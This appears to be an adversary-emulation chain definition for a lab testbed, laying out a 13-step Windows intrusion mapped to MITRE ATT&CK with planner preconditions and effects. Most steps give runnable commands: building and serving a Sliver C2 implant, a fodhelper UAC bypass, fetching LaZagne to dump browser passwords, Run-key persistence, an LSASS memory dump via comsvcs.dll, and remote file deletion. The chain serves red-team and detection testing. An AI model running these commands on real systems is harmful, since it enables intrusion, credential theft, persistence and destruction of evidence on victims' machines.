# Chain 014

**Testbed**: `env0` · **Steps**: 13 · **Tactics touched**: Command and Control, Initial Access, Execution, Discovery, Privilege Escalation, Defense Evasion, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Initial Access | T1566.002 |
| Execution | T1204.002, T1059.003, T1059.001 |
| Discovery | T1083 |
| Privilege Escalation | T1548.002 |
| Defense Evasion | T1548.002, T1070.004, T1485 |
| Credential Access | T1555.003, T1003.001 |
| Persistence | T1547.001 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1083 | Get Current Working Directory | Sliver Executor |
| 6 | Execution | T1059.003 | Execute Command (cmd.exe) | Sliver Session Derive |
| 7 | Privilege Escalation, Defense Evasion | T1548.002 | Bypass UAC using Fodhelper | Command Prompt Executor |
| 8 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 9 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 10 | Credential Access | T1555.003 | LaZagne - Credentials from Browser | Powershell Executor |
| 11 | Persistence | T1547.001 | Reg Key Run | Command Prompt Executor |
| 12 | Credential Access | T1003.001 | Dump LSASS.exe Memory using comsvcs.dll | Powershell Executor |
| 13 | Defense Evasion, Impact | T1070.004, T1485 | Remove Remote Path | Sliver Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable

- **UUID**: `simulate-execute-lnk-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut file whose target is a pre-staged executable on the victim host. LNKs are a very common phishing vehicle — often delivered inside an archive with a misleading double-extension name (e.g. `invoice.pdf.lnk`). Double-clicking the shortcut runs the pointed-to executable via `explorer.exe`.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Double-click a shortcut (.lnk) file whose target is:
#{EXE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Get Current Working Directory

- **UUID**: `sliver-pwd`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1083
- **Technique(s)**: File and Directory Discovery

**Description**

The `pwd` command returns the current working directory of the remote system. It helps to determine the current directory where commands are being executed on the remote machine, which is crucial for file management and executing further commands. The command includes flags for setting a timeout.

**Execution** (Sliver Executor)

```
pwd(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(file-and-directory-info-known ?target - host)`

---

### Step 6 — Execute Command (cmd.exe)

- **UUID**: `sliver-cmd`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: Command and Scripting Interpreter: Windows Command Shell


**Description**

The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 7 — Bypass UAC using Fodhelper

- **UUID**: `art-t1548_002-fodhelper-uac-bypass-cmd`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Privilege Escalation, Defense Evasion
- **MITRE ID(s)**: T1548.002
- **Technique(s)**: Abuse Elevation Control Mechanism: Bypass User Account Control

**Description**

Command Prompt variant of the fodhelper UAC bypass. Uses `reg.exe` (a Windows built-in, LOLBAS) to seed `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with the executable path, then launches `fodhelper.exe`. Because `fodhelper.exe` carries `autoElevate=true` in its manifest and lives in `System32`, it reads that registry value and runs it with elevated integrity — no UAC prompt for admin-group users. ART auto_generated_guid a2d43f57-2a79-4694-b13a-92f0f6c1a97d.

Same causal / precondition / effect shape as `art-t1548_002-fodhelper-uac-bypass-ps.yml`, differing only in the shell used to seed the registry. Keeping both variants lets the planner satisfy the UAC-bypass step via whichever session type it already has on hand (cmd or PowerShell derived from Meterpreter / Sliver) without inserting an extra session-derivation hop.

**Execution** (Command Prompt Executor)

```
reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "#{EXE_PATH}" /f
reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
C:\Windows\System32\fodhelper.exe
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID (unelevated, admin-group user) used to invoke the UAC-bypass sequence. | — | yes |
| `EXE_PATH` | Path of the executable on the victim host that fodhelper will run with elevated integrity. Common chain use is to point at a pre-staged Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command prompt — useful for interactive testing of the bypass itself. | C:\\Windows\\System32\\cmd.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 8 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 9 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 10 — LaZagne - Credentials from Browser

- **UUID**: `art-t1555_003-lazagne-browsers`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1555.003
- **Technique(s)**: Credentials from Password Stores: Web Browsers

**Description**

LaZagne is a cross-platform credential harvester that reads and
decrypts browser-stored passwords (Chrome, Firefox, IE/Edge, etc.).
The `browsers` module dumps decrypted plaintext credentials to
stdout. Method 3 folds the ART prereq (download LaZagne.exe v2.4.5
release binary). ART auto_generated_guid
9a2915b3-3954-4cce-8c76-00fbf4dbd014.

**Execution** (Powershell Executor)

```
$lazagne = "#{lazagne_path}"
if (-not (Test-Path $lazagne)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  New-Item -ItemType Directory (Split-Path $lazagne) -Force | Out-Null
  Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile $lazagne
}
& $lazagne browsers
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke LaZagne. | — | yes |
| `lazagne_path` | Target-side path where LaZagne is staged and invoked. | C:\\Users\\Public\\LaZagne.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 11 — Reg Key Run

- **UUID**: `art-t1547_001-reg-key-run`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

Adds a value to the `HKCU\...\CurrentVersion\Run` registry key so a
chosen command runs whenever the current user logs in. Classic user-
scope autorun; unelevated, survives reboot. ART auto_generated_guid
e55be3fd-3521-4610-9d1a-e210e42dcf05.

**Execution** (Command Prompt Executor)

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "#{value_name}" /t REG_SZ /F /D "#{command_to_execute}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke reg add. | — | yes |
| `value_name` | Registry value name under Run key. | Atomic Red Team | yes |
| `command_to_execute` | Command / path to execute at next user logon. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 12 — Dump LSASS.exe Memory using comsvcs.dll

- **UUID**: `art-t1003_001-comsvcs-minidump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Uses the built-in `comsvcs.dll` MiniDump export to write lsass.exe
memory to disk — pure LOLBAS, no external binary needed. Windows
native; no prereq to stage. ART auto_generated_guid
2536dee2-12fb-459a-8c37-971844fa73be.

**Execution** (Powershell Executor)

```
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id "#{output_file}" full
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke rundll32 → comsvcs. | — | yes |
| `output_file` | Target-side path for the resulting LSASS memory dump. | C:\\Users\\Public\\lsass-comsvcs.dmp | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`
- `(callback-covered ?f - file)`

---

### Step 13 — Remove Remote Path

- **UUID**: `sliver-rm`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: Indicator Removal: File Deletion
, Data Destruction

**Description**

The `rm(remote_path, recursive=False, force=False)` command removes a directory or file(s) from the remote system. Parameters include remote_path (remote path), recursive (recursively remove file(s)), and force (forcefully remove the file(s)).

**Execution** (Sliver Executor)

```
rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `RemotePath` | Remote path | — | yes |
| `Recursive` | Recursively remove file(s) | — | yes |
| `Force` | Forcefully remove the file(s) | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
